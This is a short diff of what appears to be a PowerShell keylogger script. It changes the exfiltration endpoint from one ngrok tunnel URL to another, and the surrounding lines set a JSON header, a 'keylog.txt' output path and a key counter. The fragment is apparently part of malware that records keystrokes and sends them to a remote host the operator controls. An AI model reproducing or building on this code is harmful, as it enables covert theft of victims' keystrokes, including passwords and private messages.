@@ -19,7 +19,7 @@ if ($null -eq $API) {
     exit
 }
 
-$uri = "https://1f37-27-4-137-234.ngrok-free.app/receive-data"
+$uri = "https://eba2-60-243-45-209.ngrok-free.app"
 $headers = @{"Content-Type" = "application/json"}
 $outputFilePath = "C:\Users\keylog.txt"
 $keyCount = 0
